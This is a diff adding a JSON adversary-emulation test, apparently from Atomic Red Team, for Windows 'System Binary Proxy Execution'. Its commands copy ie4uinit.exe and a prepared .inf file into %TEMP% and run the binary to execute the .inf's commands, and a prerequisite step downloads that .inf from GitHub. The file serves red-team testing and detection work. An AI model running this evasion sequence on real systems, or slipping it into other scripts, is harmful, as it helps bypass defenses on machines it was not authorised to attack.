@@ -1,0 +1,42 @@
+{
+    "name": "Lolbas ie4uinit.exe use as proxy",
+    "description": "Executes commands from a specially prepared ie4uinit.inf file. Poc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/ Reference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/ ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "copy #{Path_ie4uinit} %TEMP%\\ie4uinit.exe\ncopy \"#{Path_inf}\" %TEMP%\\ieuinit.inf\n%TEMP%\\ie4uinit.exe -BaseSettings\n",
+        "cleanup_command": "del %TEMP%\\ie4uinit.exe >nul 2>&1\ndel %TEMP%\\ieuinit.inf >nul 2>&1\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1218",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "System Binary Proxy Execution",
+    "source": "ART",
+    "uuid": "13c0804e-615e-43ad-b223-2dfbacd0b0b3",
+    "arguments": {
+        "Path_inf": {
+            "description": "Path to the cab file",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1218\\src\\ieuinit.inf"
+        },
+        "Path_ie4uinit": {
+            "description": "Path to ie4uinit.exe",
+            "type": "path",
+            "default": "c:\\windows\\system32\\ie4uinit.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "ieuinit.inf must exist on disk at specified location (#{Path_inf})\n",
+            "prereq_command": "if (Test-Path \"#{Path_inf}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{Path_inf}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf\" -OutFile \"#{Path_inf}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
